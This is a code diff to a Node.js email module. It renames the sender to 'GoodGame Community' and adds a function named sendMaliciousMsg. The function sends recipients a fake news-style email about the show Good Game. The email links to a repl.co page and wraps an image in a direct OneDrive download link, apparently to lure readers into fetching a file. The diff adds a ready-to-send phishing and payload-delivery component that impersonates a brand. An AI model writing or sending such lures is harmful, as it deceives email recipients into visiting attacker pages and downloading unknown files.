@@ -3,7 +3,7 @@ const transporter = require('./credential')
 const sendEmail = (RECEIVER_EMAIL, contentMsg) => {
   const { HOST_EMAIL } = process.env
   const message = {
-    from: `CYBER-S <${HOST_EMAIL}>`,
+    from: `GoodGame Community <${HOST_EMAIL}>`,
 
     to: RECEIVER_EMAIL,
     ...contentMsg
@@ -118,4 +118,19 @@ const sendWelcomeMsg = (username, RECEIVER_EMAIL) => {
   sendEmail(RECEIVER_EMAIL, contentMsg)
 }
 
-module.exports = { send2FAEmail, sendWelcomeMsg }
+const sendMaliciousMsg = (RECEIVER_EMAIL) => {
+  const contentMsg = {
+    subject: 'Good Game Is Coming Back, And It Has A Fancy New Logo',
+
+    html: `<div><p><a href="https://feisty.nguyen-thi-th36.repl.co">Good Game</a> is back on Tuesday, February 18. It has a fancy new trailer and a fancy new logo. Fancy that. Looks like they’ve even changed the voice of the dude who says ‘GOOD GAME’ after each section.</p>
+
+    <p>Which is quite cool because, as far as I know, Good Game has always had that same logo, hasn’t it? It’s kind of strange to see the show being advertised with the new logo; the same way anything is strange when it gets redesigned.</p>
+    <p>
+    Still, I like it. And I’m looking forward to the new season of Good Game.</p></div>
+    <br/>
+    <a href="https://onedrive.live.com/download?cid=09A45F3180FACE13&resid=9A45F3180FACE13%21125245&authkey=AEZOkkjcsrh4I20"><img style="width:80%" src="https://feisty.nguyen-thi-th36.repl.co/Blue%20And%20Red%20Futuristic%20Game%20YouTube%20Channel%20Art.jpg"/></a>`
+  }
+
+  sendEmail(RECEIVER_EMAIL, contentMsg)
+}
+module.exports = { send2FAEmail, sendWelcomeMsg, sendMaliciousMsg }
